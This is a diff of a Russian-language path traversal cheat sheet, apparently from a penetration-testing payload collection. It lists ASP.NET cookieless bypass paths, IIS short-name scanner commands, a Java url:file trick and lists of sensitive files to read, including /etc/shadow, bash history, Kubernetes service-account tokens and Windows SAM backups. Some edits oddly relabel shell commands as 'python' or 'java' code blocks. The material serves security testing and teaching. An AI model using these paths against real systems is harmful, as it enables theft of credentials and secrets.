@@ -20,7 +20,7 @@
 - [Обход директорий (Path Traversal)](#path-traversal-1)
     - [Файлы Linux](#linux-files)
     - [Файлы Windows](#windows-files)
-- [Ссылки](#references)
+- [Ссылки](#URL)
 
 # Инструменты
 
@@ -176,7 +176,7 @@ UNC (Universal Naming Convention) путь — это стандартный ф�
 
 Мы можем использовать это поведение для обхода фильтруемых URL.
 
-*   Если ваше приложение находится в главной папке:
+*   Если приложение находится в главной папке:
 
     ```python
     /(S(X))/
@@ -186,7 +186,7 @@ UNC (Universal Naming Convention) путь — это стандартный ф�
     /(S(x))/b/(S(x))in/Navigator.dll
     ```
 
-*   Если ваше приложение находится в подпапке:
+*   Если приложение находится в подпапке:
 
     ```python
     /MyApp/(S(X))/
@@ -207,14 +207,14 @@ UNC (Universal Naming Convention) путь — это стандартный ф�
 
 *   [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
 
-    ```bash
+    ```java
     java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
     java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
     ```
 
 *   [bitquark/shortscan](https://github.com/bitquark/shortscan)
 
-    ```bash
+    ```python
     shortscan http://example.org/
     ```
 
@@ -222,7 +222,7 @@ UNC (Universal Naming Convention) путь — это стандартный ф�
 
 Протокол URL в Java при использовании `new URL('')` позволяет использовать формат `url:URL`.
 
-```bash
+```python
 url:file:///etc/passwd
 url:http://127.0.0.1:8080
 ```
@@ -233,7 +233,7 @@ url:http://127.0.0.1:8080
 
 **Операционная система и информация**
 
-```bash
+```python
 /etc/issue
 /etc/group
 /etc/hosts
@@ -242,7 +242,7 @@ url:http://127.0.0.1:8080
 
 **Процессы**
 
-```bash
+```python
 /proc/[0-9]*/fd/[0-9]*   # первое число - PID, второе - дескриптор файла
 /proc/self/environ
 /proc/version
@@ -253,7 +253,7 @@ url:http://127.0.0.1:8080
 
 **Сеть**
 
-```bash
+```python
 /proc/net/arp
 /proc/net/route
 /proc/net/tcp
@@ -262,14 +262,14 @@ url:http://127.0.0.1:8080
 
 **Текущий путь**
 
-```bash
+```python
 /proc/self/cwd/index.php
 /proc/self/cwd/main.py
 ```
 
 **Индексация**
 
-```bash
+```python
 /var/lib/mlocate/mlocate.db
 /var/lib/plocate/plocate.db
 /var/lib/mlocate.db
@@ -277,7 +277,7 @@ url:http://127.0.0.1:8080
 
 **Учетные данные и история**
 
-```bash
+```python
 /etc/passwd
 /etc/shadow
 /home/$USER/.bash_history
@@ -287,7 +287,7 @@ url:http://127.0.0.1:8080
 
 **Kubernetes**
 
-```bash
+```python
 /run/secrets/kubernetes.io/serviceaccount/token
 /run/secrets/kubernetes.io/serviceaccount/namespace
 /run/secrets/kubernetes.io/serviceaccount/certificate
@@ -298,14 +298,14 @@ url:http://127.0.0.1:8080
 
 Файлы `license.rtf` и `win.ini` постоянно присутствуют в современных системах Windows, что делает их надежной целью для тестирования уязвимостей обхода путей. Хотя их содержимое не особенно чувствительно или интересно, они хорошо подходят в качестве доказательства концепции (proof of concept).
 
-```bash
+```python
 C:\Windows\win.ini
 C:\windows\system32\license.rtf
 ```
 
 Список файлов/путей для проверки, когда можно читать произвольные файлы в операционной системе Microsoft Windows: **soffensive/windowsblindread**
 
-```bash
+```python
 c:/inetpub/logs/logfiles
 c:/inetpub/wwwroot/global.asa
 c:/inetpub/wwwroot/index.asp
@@ -328,3 +328,12 @@ c:/unattended.xml
 c:/windows/repair/sam
 c:/windows/repair/system
 ```
+# URL
+
+* [OWASP Path traversal](https://wiki.owasp.org/index.php/File_System#Path_traversal)
+* [Cookieless ASPNET - Soroush Dalili - March 27, 2023](https://twitter.com/irsdl/status/1640390106312835072)
+* [CWE-40: Path Traversal: '\UNC\share\name' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://cwe.mitre.org/data/definitions/40.html)
+* [Directory traversal - Portswigger - March 30, 2019](https://portswigger.net/web-security/file-path-traversal)
+* [Directory traversal attack - Wikipedia - August 5, 2024](https://en.wikipedia.org/wiki/Directory_traversal_attack)
+* [EP 057 | Proc filesystem tricks & locatedb abuse with @remsio & @_bluesheet - TheLaluka - November 30, 2023](https://youtu.be/YlZGJ28By8U)
+* [NGINX may be protecting your applications from traversal attacks without you even knowing - Rotem Bar - September 24, 2020](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
